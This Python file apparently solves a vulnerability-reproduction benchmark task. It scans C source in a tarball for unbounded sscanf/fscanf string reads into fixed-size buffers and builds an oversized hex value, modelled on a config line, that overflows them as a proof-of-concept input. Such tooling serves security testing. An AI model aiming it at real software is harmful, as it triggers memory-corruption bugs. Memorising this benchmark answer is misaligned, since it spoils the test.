import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return b.decode("latin-1", errors="ignore")


_C_STR_RE = re.compile(r'"(?:\\.|[^"\\])*"', re.DOTALL)


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append("\\")
            break
        c = s[i]
        i += 1
        if c == "n":
            out.append("\n")
        elif c == "r":
            out.append("\r")
        elif c == "t":
            out.append("\t")
        elif c == "v":
            out.append("\v")
        elif c == "f":
            out.append("\f")
        elif c == "a":
            out.append("\a")
        elif c == "b":
            out.append("\b")
        elif c == "\\":
            out.append("\\")
        elif c == '"':
            out.append('"')
        elif c == "'":
            out.append("'")
        elif c == "x":
            hex_digits = []
            while i < n and len(hex_digits) < 2 and s[i] in "0123456789abcdefABCDEF":
                hex_digits.append(s[i])
                i += 1
            if hex_digits:
                out.append(chr(int("".join(hex_digits), 16)))
            else:
                out.append("x")
        elif c in "01234567":
            oct_digits = [c]
            while i < n and len(oct_digits) < 3 and s[i] in "01234567":
                oct_digits.append(s[i])
                i += 1
            out.append(chr(int("".join(oct_digits), 8)))
        else:
            out.append(c)
    return "".join(out)


def _extract_c_string_literals(expr: str) -> Optional[str]:
    s = expr.strip()
    if not s:
        return None
    parts = []
    pos = 0
    for m in _C_STR_RE.finditer(s):
        if s[pos:m.start()].strip():
            return None
        lit = m.group(0)
        parts.append(_c_unescape(lit[1:-1]))
        pos = m.end()
    if s[pos:].strip():
        return None
    if not parts:
        return None
    return "".join(parts)


def _extract_var_name(expr: str) -> Optional[str]:
    if not expr:
        return None
    s = expr.strip()
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL).strip()
    while s and s[0] in "&*(":
        s = s[1:].lstrip()
    while s and s[-1] in ")":
        s = s[:-1].rstrip()
    s = re.sub(r"\[[^\]]*\]$", "", s).strip()
    if "->" in s:
        s = s.split("->")[-1].strip()
    if "." in s:
        s = s.split(".")[-1].strip()
    m = re.search(r"([A-Za-z_]\w*)\s*$", s)
    if not m:
        return None
    return m.group(1)


def _extract_call(text: str, func_pos: int) -> Optional[Tuple[int, int, str]]:
    n = len(text)
    i = func_pos
    while i < n and text[i] != "(":
        i += 1
    if i >= n or text[i] != "(":
        return None
    start = i
    depth = 0
    in_str = False
    in_chr = False
    esc = False
    i = start
    while i < n:
        c = text[i]
        if in_str:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
        elif in_chr:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
        else:
            if c == '"':
                in_str = True
            elif c == "'":
                in_chr = True
            elif c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    end = i
                    return (start, end, text[start + 1:end])
        i += 1
    return None


def _split_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth_p = 0
    depth_b = 0
    depth_c = 0
    in_str = False
    in_chr = False
    esc = False
    for c in arg_str:
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_str = False
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_chr = False
            continue

        if c == '"':
            in_str = True
            cur.append(c)
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            continue

        if c == "(":
            depth_p += 1
            cur.append(c)
            continue
        if c == ")":
            depth_p = max(0, depth_p - 1)
            cur.append(c)
            continue
        if c == "[":
            depth_b += 1
            cur.append(c)
            continue
        if c == "]":
            depth_b = max(0, depth_b - 1)
            cur.append(c)
            continue
        if c == "{":
            depth_c += 1
            cur.append(c)
            continue
        if c == "}":
            depth_c = max(0, depth_c - 1)
            cur.append(c)
            continue

        if c == "," and depth_p == 0 and depth_b == 0 and depth_c == 0:
            a = "".join(cur).strip()
            if a:
                args.append(a)
            cur = []
        else:
            cur.append(c)

    a = "".join(cur).strip()
    if a:
        args.append(a)
    return args


@dataclass
class _ConvSpec:
    start: int
    conv: str
    width: Optional[int]
    suppressed: bool


def _parse_format_specs(fmt: str) -> List[_ConvSpec]:
    specs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        start = i
        i += 1
        suppressed = False
        if i < n and fmt[i] == "*":
            suppressed = True
            i += 1
        width = None
        j = i
        while j < n and fmt[j].isdigit():
            j += 1
        if j > i:
            try:
                width = int(fmt[i:j])
            except Exception:
                width = None
            i = j
        if i + 1 < n and fmt[i:i + 2] in ("hh", "ll"):
            i += 2
        elif i < n and fmt[i] in ("h", "l", "j", "z", "t", "L"):
            i += 1
        if i >= n:
            break
        conv = fmt[i]
        i += 1
        if conv == "[":
            if i < n and fmt[i] == "^":
                i += 1
            if i < n and fmt[i] == "]":
                i += 1
            while i < n and fmt[i] != "]":
                if fmt[i] == "\\" and i + 1 < n:
                    i += 2
                else:
                    i += 1
            if i < n and fmt[i] == "]":
                i += 1
            specs.append(_ConvSpec(start=start, conv="[", width=width, suppressed=suppressed))
        else:
            specs.append(_ConvSpec(start=start, conv=conv, width=width, suppressed=suppressed))
    return specs


@dataclass
class _Candidate:
    source_name: str
    func: str
    fmt: str
    prefix: str
    has_0x_in_fmt: bool
    bufsize: Optional[int]
    score: int


_HEX_RE = re.compile(r"0x[0-9a-fA-F]+")


def _make_hex_token(desired_len: int, include_0x: bool) -> str:
    if desired_len < 1:
        desired_len = 1
    if include_0x:
        if desired_len < 3:
            desired_len = 3
        digits_len = desired_len - 2
        if digits_len < 1:
            digits_len = 1
        if digits_len % 2 == 1:
            digits_len += 1
        return "0x" + ("1" * digits_len)
    else:
        digits_len = desired_len
        if digits_len % 2 == 1:
            digits_len += 1
        return "1" * digits_len


def _build_array_size_index(files: Dict[str, str]) -> Dict[str, int]:
    idx: Dict[str, int] = {}
    decl_re = re.compile(
        r"\b(?:unsigned\s+)?(?:char|uint8_t|int8_t|BYTE)\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]"
    )
    for _, txt in files.items():
        for m in decl_re.finditer(txt):
            name = m.group(1)
            try:
                sz = int(m.group(2))
            except Exception:
                continue
            if sz <= 0 or sz > 1_000_000:
                continue
            prev = idx.get(name)
            if prev is None or sz < prev:
                idx[name] = sz
    return idx


def _find_config_template(files_raw: Dict[str, bytes]) -> Optional[Tuple[str, str, str]]:
    cfg_exts = {".conf", ".cfg", ".ini", ".cnf", ".config"}
    best = None
    for name, data in files_raw.items():
        base = os.path.basename(name).lower()
        ext = os.path.splitext(base)[1]
        if ext not in cfg_exts and "conf" not in base and "cfg" not in base:
            continue
        if len(data) > 200_000:
            continue
        txt = _safe_decode(data).replace("\r\n", "\n").replace("\r", "\n")
        if "0x" not in txt and "0X" not in txt:
            continue
        lines = txt.split("\n")
        section = ""
        for line in lines:
            s = line.strip()
            if not s or s.startswith("#") or s.startswith(";"):
                continue
            if s.startswith("[") and s.endswith("]") and len(s) <= 80:
                section = s
                continue
            m = _HEX_RE.search(line)
            if not m:
                continue
            prefix = line[:m.start()]
            suffix = line[m.end():]
            score = 0
            if "=" in prefix:
                score += 50
            if ":" in prefix:
                score += 20
            if "hex" in prefix.lower():
                score += 30
            score += max(0, 1000 - len(line))
            cand = (score, section, prefix, suffix)
            if best is None or cand[0] > best[0]:
                best = cand
            break
    if best is None:
        return None
    _, section, prefix, suffix = best
    return (section, prefix, suffix)


def _find_candidates(files: Dict[str, str], array_sizes: Dict[str, int]) -> List[_Candidate]:
    candidates: List[_Candidate] = []
    call_re = re.compile(r"\b(sscanf|fscanf|scanf)\s*\(", re.MULTILINE)
    for fname, txt in files.items():
        for m in call_re.finditer(txt):
            func = m.group(1)
            call = _extract_call(txt, m.end() - 1)
            if not call:
                continue
            _, _, inside = call
            args = _split_args(inside)
            if len(args) < 2:
                continue
            fmt_lit = _extract_c_string_literals(args[1])
            if fmt_lit is None:
                continue
            specs = _parse_format_specs(fmt_lit)
            if not specs:
                continue

            conv_arg_index = 0
            for spec in specs:
                if spec.suppressed:
                    continue
                arg_pos = 2 + conv_arg_index
                conv_arg_index += 1
                if arg_pos >= len(args):
                    break
                if spec.conv not in ("s", "["):
                    continue
                if spec.width is not None:
                    continue

                arg_expr = args[arg_pos]
                var = _extract_var_name(arg_expr)
                bufsize = array_sizes.get(var) if var else None

                prefix_literal = fmt_lit[:spec.start]
                prefix = prefix_literal.lstrip()
                fmt_lower = fmt_lit.lower()
                has_0x = "0x" in fmt_lower
                if not prefix:
                    if "=" in fmt_lit:
                        prefix = "A="
                    elif ":" in fmt_lit:
                        prefix = "A:"
                    else:
                        prefix = "A "
                score = 0
                if bufsize is not None and 4 <= bufsize <= 8192:
                    score += 3000 - bufsize
                if func == "fscanf":
                    score += 200
                if has_0x:
                    score += 250
                if "hex" in fmt_lower:
                    score += 250
                if "=" in fmt_lit:
                    score += 80
                if "conf" in fname.lower() or "cfg" in fname.lower():
                    score += 60
                if "/test" in fname.lower() or "\\test" in fname.lower():
                    score -= 200
                candidates.append(
                    _Candidate(
                        source_name=fname,
                        func=func,
                        fmt=fmt_lit,
                        prefix=prefix,
                        has_0x_in_fmt=has_0x,
                        bufsize=bufsize,
                        score=score,
                    )
                )
    candidates.sort(key=lambda c: c.score, reverse=True)
    return candidates


class Solution:
    def solve(self, src_path: str) -> bytes:
        files_raw: Dict[str, bytes] = {}
        files_txt: Dict[str, str] = {}

        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                files_raw[name] = data
                lower = name.lower()
                if lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                    files_txt[name] = _safe_decode(data)

        array_sizes = _build_array_size_index(files_txt)
        template = _find_config_template(files_raw)
        candidates = _find_candidates(files_txt, array_sizes)

        chosen = candidates[0] if candidates else None

        if chosen and chosen.bufsize is not None and 4 <= chosen.bufsize <= 8192:
            desired_value_len = min(max(chosen.bufsize + 16, 128), 4096)
        else:
            desired_value_len = 546  # token length (w/o newline) for 547-byte PoC with newline

        if template:
            section, prefix, suffix = template
            pref = prefix
            include_0x = True
            if pref.lower().rstrip().endswith("0x"):
                include_0x = False
            token = _make_hex_token(desired_value_len, include_0x)
            line = pref + token + suffix
            out_lines = []
            if section:
                out_lines.append(section)
            out_lines.append(line.rstrip("\n"))
            return ("\n".join(out_lines) + "\n").encode("ascii", errors="ignore")

        if chosen:
            prefix = chosen.prefix
            include_0x = True
            if prefix.lower().rstrip().endswith("0x"):
                include_0x = False
            token = _make_hex_token(desired_value_len, include_0x)
            payload = (prefix + token + "\n").encode("ascii", errors="ignore")
            return payload

        token = _make_hex_token(desired_value_len, include_0x=True)
        return (token + "\n").encode("ascii", errors="ignore")